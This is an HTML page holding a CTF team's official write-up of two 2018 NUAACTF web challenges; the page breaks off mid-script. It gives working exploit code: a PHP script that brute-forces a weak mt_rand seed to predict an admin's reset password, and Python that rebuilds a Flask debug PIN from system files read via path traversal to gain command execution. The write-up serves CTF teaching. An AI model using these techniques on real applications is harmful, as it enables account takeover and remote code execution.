<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>NUAACTF_2018 官方wp | Asuri Team</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）">
<meta property="og:type" content="article">
<meta property="og:title" content="NUAACTF_2018 官方wp">
<meta property="og:url" content="http://asuri.org/2018/12/25/NUAACTF-2018-%E5%AE%98%E6%96%B9wp/index.html">
<meta property="og:site_name" content="Asuri Team">
<meta property="og:description" content="2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）">
<meta property="og:locale">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2z3q4rj21ne16ukee.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5gec83j21p01687wh.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5htvfcj21kk1501fx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjfizh8pj21yg150qay.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjhb6wn6j211o0kkjuq.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjksc5oij20o20hitam.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1650iujj21kg16g7wh.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1dv0agwj228017wn4v.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1fdbkonj228017ygtf.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1lzc5jej228017qdry.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi9o8be0bj227616s7hc.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyia0yt2bij228017s47p.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiauiinyrj227w180jx9.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaul3dphj228017ogqx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyiaw8k1jjj2280180jwx.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibr7mtsvj21yo13444v.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyibz19mwyj21yu18qwmv.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhkjy5wj21z218sguq.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidhhna5tj21ys18gww2.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidkqxytej21yu190k01.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsve7dlj21yq0v0n5d.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidsyg0uaj2102038adb.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidw0hu30j228018kdpv.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyidyds8e7j227w18uk1b.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyie2v8gsnj2280196qfm.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieei3nmoj2280192tlm.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/64ef14dcgy1fyieefah7pj227y18qgwt.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/006daSSqgy1fy8sxqzmwjj31ea0hx78u.jpg">
<meta property="og:image" content="https://ws1.sinaimg.cn/large/006daSSqgy1fy8syh9uwzj30se0i4gmx.jpg">
<meta property="article:published_time" content="2018-12-25T04:23:41.000Z">
<meta property="article:modified_time" content="2023-04-07T12:29:53.466Z">
<meta property="article:author" content="All Members">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="nuaactf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg">
  
    <link rel="alternate" href="/atom.xml" title="Asuri Team" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  

<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <div id="container">
    

    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Asuri Team</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
          <a class="main-nav-link" href="/members">Members</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://asuri.org"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-NUAACTF-2018-官方wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/12/25/NUAACTF-2018-%E5%AE%98%E6%96%B9wp/" class="article-date">
  <time datetime="2018-12-25T04:23:41.000Z" itemprop="datePublished">2018-12-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Writeup/">Writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      NUAACTF_2018 官方wp
    </h1>
  


  <div class="article-author">
    <img src="https://www.gravatar.com/avatar/204a0c779acdb62f9084826396f6dccb?s=48">
    <div class="article-author-info">
      <a href="/author/zedd" class="article-author-name">ZeddYu</a>
      <a target="_blank" rel="noopener" href="https://blog.zeddyu.info" class="article-author-site" title="Visit the author's site">[site]</a>
      <div class="article-author-about" title="16级成员，萌新 Web 选手，一个想去 DEFCON 的萌新">16级成员，萌新 Web 选手，一个想去 DEFCON 的萌新</div>
    </div>
  </div>


      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>2018南京航空航天大学第三届“补天杯”信息安全竞赛解题报告（2018NUAACTF Writeup）</p>
<a id="more"></a>



<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1-Asuri-Information-System"><a href="#Web1-Asuri-Information-System" class="headerlink" title="Web1    Asuri-Information-System"></a>Web1    Asuri-Information-System</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf.asuri.org:8001</span><br><span class="line"></span><br><span class="line">听说有五个很厉害的人，一个是admin,一个是admin1,一个是admin2,一个是admin3,一个是admin4。听说打败他们其中一个就可以拿到flag啦</span><br><span class="line"></span><br><span class="line">flag格式为NUAACTF&#123;.*&#125;</span><br></pre></td></tr></table></figure>

<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>根据题目描述，我们要做的肯定就是要去登录<code>admin[1-4] || admin</code>了。</p>
<p>首先进入题目界面，发现题目功能很简单，首页只提供注册登录两个功能。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2xspy3j21ma1641kx.jpg"></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj2z3q4rj21ne16ukee.jpg"></p>
<p>我们先随便登录注册一下，进去后发现有个重置密码的功能。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5gec83j21p01687wh.jpg"></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhj5htvfcj21kk1501fx.jpg"></p>
<p>重置一下抓包看看。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjfizh8pj21yg150qay.jpg"></p>
<p>然后真的发现自己邮箱里面多了一封重置密码的邮件。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjhb6wn6j211o0kkjuq.jpg"></p>
<p>扫目录可以得到<code>www.zip</code>，发现题目的所有基本源码。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcly1fyhjksc5oij20o20hitam.jpg"></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>基本的信息如上，然后我们可以根据已有信息来看，从那个重置密码请求包来看，貌似我们可以控制重置用户的用户名。那我们是不是可以重置<code>amdin</code>的密码，通过什么方式登录上呢，而且那个请求包还有回显了一个<code>int</code>也比较奇怪，看起来像是<code>var_dump()</code>出来的数据。</p>
<p>通过大概的代码审计，题目用了在<code>sql</code>语句的地方预编译，所以没什么办法注入得到<code>admin</code></p>
<p>查看<code>handler</code>源码:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;.&#x2F;config.php&quot;;</span><br><span class="line">require &quot;.&#x2F;email.php&quot;;</span><br><span class="line"></span><br><span class="line">function generatePasswd()&#123;</span><br><span class="line">    mt_srand((double) microtime() * 1000000);</span><br><span class="line">    var_dump(mt_rand());</span><br><span class="line">    return substr(md5(mt_rand()),0,6);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function changePasswd($username, $password)&#123;</span><br><span class="line">    $password &#x3D; md5($password);</span><br><span class="line">    $stmt &#x3D; $GLOBALS[&#39;dbh&#39;]-&gt;prepare(&quot;UPDATE users SET password &#x3D; ? WHERE username &#x3D; ?&quot;);</span><br><span class="line">    $stmt-&gt;bind_param(&#39;ss&#39;, $password, $username);</span><br><span class="line">    $stmt-&gt;execute();</span><br><span class="line">    if ($stmt-&gt;affected_rows &#x3D;&#x3D;&#x3D; 1)&#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(\&quot;Success!\&quot;);history.back(-1);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;&lt;script&gt;alert(\&quot;Error!\&quot;);history.back(-1);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    $stmt-&gt;free_result();</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function getEmail($username)&#123;</span><br><span class="line">    if ($username)&#123;</span><br><span class="line">        $stmt &#x3D; $GLOBALS[&#39;dbh&#39;]-&gt;prepare(&quot;SELECT email From users where username &#x3D; ?&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&#39;s&#39;, $username);</span><br><span class="line">        $stmt-&gt;bind_result($email);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        if($stmt-&gt;fetch())&#123;</span><br><span class="line">            return $email;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">            return &quot;error!&quot;;</span><br><span class="line">        $stmt-&gt;free_result();</span><br><span class="line">        $stmt-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        return &quot;error!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username &#x3D; isset($_POST[&#39;username&#39;]) ? trim($_POST[&#39;username&#39;]) : NULL;</span><br><span class="line">$email &#x3D; getEmail($username);</span><br><span class="line">if ($email &#x3D;&#x3D; &quot;error!&quot;)&#123;</span><br><span class="line">    echo &quot;Error!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$passwd &#x3D; generatePasswd();</span><br><span class="line">if(sendMail($email,$passwd))&#123;</span><br><span class="line">    changePasswd($username,$passwd);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &quot;&lt;script&gt;alert(\&quot;Error! Check your Email address plz!\&quot;);history.back(-1);&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Asuri-Team Managment System&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>通过代码审计，我们可以看到传入的<code>username</code>到了<code>getEmail</code>这个函数，这个函数用了预编译，所以我们没什么办法注入。这个函数就是根据<code>username</code>返回对应<code>email</code>，通过<code>generatePasswd()</code>产生随机密码，通过<code>sendMail()</code>发送密码到邮箱，最后用<code>changePasswd()</code>来修改数据库中的密码。</p>
<p>整个逻辑基本清楚了，所以我们是可以通过传入一个<code>username=admin</code>来重置管理员的密码。但是怎么登录成<code>admin</code>呢，我们是不是可以通过爆破随机密码或者破解随机密码来登录呢。</p>
<p>我们重点看看<code>generatePasswd()</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generatePasswd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    mt_srand((<span class="keyword">double</span>) microtime() * <span class="number">1000000</span>);</span><br><span class="line">    var_dump(mt_rand());</span><br><span class="line">    <span class="keyword">return</span> substr(md5(mt_rand()),<span class="number">0</span>,<span class="number">6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到，页面上的<code>int(2055522123)</code>即是<code>var_dump(mt_rand());</code>的显示结果。</p>
<p>可以看看</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> mt_srand ([ <span class="keyword">int</span> <span class="variable">$seed</span> ] )</span><br><span class="line">用 seed 来给随机数发生器播种。 没有设定 seed 参数时，会被设为随时数。</span><br><span class="line"></span><br><span class="line">Note: 自 PHP <span class="number">4.2</span><span class="number">.0</span> 起，不再需要用 srand() 或 mt_srand() 给随机数发生器播种 ，因为现在是由系统自动完成的。</span><br></pre></td></tr></table></figure>

<p>然后随机数种子是<code>(double) microtime() * 1000000</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mixed microtime ([ <span class="keyword">bool</span> <span class="variable">$get_as_float</span> ] )</span><br><span class="line">microtime() 当前 Unix 时间戳以及微秒数。本函数仅在支持 gettimeofday() 系统调用的操作系统下可用。</span><br><span class="line"></span><br><span class="line">如果调用时不带可选参数，本函数以 <span class="string">&quot;msec sec&quot;</span> 的格式返回一个字符串，其中 sec 是自 Unix 纪元（<span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span> January <span class="number">1</span>, <span class="number">1970</span> GMT）起到现在的秒数，msec 是微秒部分。字符串的两部分都是以秒为单位返回的。</span><br><span class="line"></span><br><span class="line">如果给出了 get_as_float 参数并且其值等价于 <span class="literal">TRUE</span>，microtime() 将返回一个浮点数。</span><br><span class="line"></span><br><span class="line">Note: get_as_float 参数是 PHP <span class="number">5.0</span><span class="number">.0</span> 新加的。</span><br></pre></td></tr></table></figure>

<p>所以这里<code>microtime() * 1000000</code>是不超过7位数的，而且第一次随机数我们已经得到了，我们可以通过爆破随机数种子来得到随机数。</p>
<p>贴一个自己写的<code>php exp</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// echo ((double) microtime() * 1000000).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// mt_srand((double) microtime() * 1000000);</span></span><br><span class="line"><span class="comment">// var_dump(mt_rand());</span></span><br><span class="line"><span class="comment">// echo substr(md5(mt_rand()),0,6);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// int(1409622410)</span></span><br><span class="line"><span class="comment">// bc700b</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$seed</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">1000000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    mt_srand(<span class="variable">$i</span>);</span><br><span class="line">    <span class="variable">$str</span> = mt_rand();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="number">1796651235</span>)&#123;</span><br><span class="line">        <span class="variable">$seed</span> = <span class="variable">$i</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$seed</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">mt_srand(<span class="variable">$seed</span>);</span><br><span class="line">mt_rand();</span><br><span class="line"><span class="keyword">echo</span> substr(md5(mt_rand()),<span class="number">0</span>,<span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<p>猜解得到密码登录就可以得到<code>flag</code></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1650iujj21kg16g7wh.jpg"></p>
<p>这里避免给大家竞争随机…就给了5个<code>amdin</code>，其实应该注册一个就对应给一个<code>admin</code>，但是感觉5个应该差不多了…</p>
<h3 id="Web2-男航理工大学选课系统"><a href="#Web2-男航理工大学选课系统" class="headerlink" title="Web2    男航理工大学选课系统"></a>Web2    男航理工大学选课系统</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ctf.asuri.org:8003</span><br><span class="line"></span><br><span class="line">小火汁，听说你想选课？</span><br><span class="line"></span><br><span class="line">flag格式为NUAACTF&#123;.*&#125;</span><br></pre></td></tr></table></figure>

<h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><p>题目设置非常简单</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1dv0agwj228017wn4v.jpg"></p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1fdbkonj228017ygtf.jpg"></p>
<p>就一个登录注册界面。然后给了一个<code>www.zip</code>的附件，放出了关键源码。</p>
<p>然后，随便点一个选课，就报错了。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fyi1lzc5jej228017qdry.jpg"></p>
<p>再看看源码，其中在<code>user.py</code>中发现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@users.route(<span class="params"><span class="string">&#x27;/asserts/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">static_handler</span>(<span class="params">path</span>):</span></span><br><span class="line">    filename = os.path.join(app.root_path,<span class="string">&#x27;asserts&#x27;</span>,path)</span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(filename):</span><br><span class="line">        <span class="keyword">return</span> send_file(filename)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br></pre></td></tr></table></figure>



<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>这个题熟悉<code>flask</code>的会发现，那个报错页面其实就是开启了<code>debug</code>的界面，我们可以利用<code>pin</code>码来认证<code>debug</code>界面进行命令执行。</p>
<p>而关于<code>pin</code>码，我看赛时很多队伍都采取爆破的方式，导致输入过多，就不能再输入了。就导致我赛时只能人肉运维重置<code>web2</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">md5_list &#x3D; [</span><br><span class="line">    &#39;root&#39;, #当前用户，可通过读取&#x2F;etc&#x2F;passwd获取</span><br><span class="line">    &#39;flask.app&#39;, #一般情况为固定值</span><br><span class="line">    &#39;Flask&#39;, #一般情况为固定值</span><br><span class="line">    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;flask&#x2F;app.pyc&#39;, #可通过debug错误页面获取</span><br><span class="line">    &#39;2485377892354&#39;, #mac地址的十进制，通过读取&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address获取mac地址  如果不是映射端口 可以通过arp ip命令获取</span><br><span class="line">    &#39;0c5b39a3-bba2-472c-a43d-8e013b2874e8&#39; #机器名，通过读取&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id 或&#x2F;etc&#x2F;machine-id获取</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>

<p>生成<code>pin</code>码的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin</span>(<span class="params">md5_list</span>):</span></span><br><span class="line">	h = hashlib.md5()</span><br><span class="line">	<span class="keyword">for</span> bit <span class="keyword">in</span> md5_list:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, unicode):</span><br><span class="line">			bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">		h.update(bit)</span><br><span class="line">	h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">	h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">	num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">	<span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">			rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">						  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		rv = num</span><br><span class="line">	<span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure>

<p>拿到pin码便可执行命令。</p>
<p>具体可以参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2553">Flask debug pin安全问题</a></p>
<p>贴一下这题得到的<code>exp</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pin</span>(<span class="params">md5_list</span>):</span></span><br><span class="line">	h = hashlib.md5()</span><br><span class="line">	<span class="keyword">for</span> bit <span class="keyword">in</span> md5_list:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, unicode):</span><br><span class="line">			bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">		h.update(bit)</span><br><span class="line">	h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">	h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">	num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">	<span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">			rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">						  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		rv = num</span><br><span class="line">	<span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">name = get_name()</span><br><span class="line">md5_list = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span 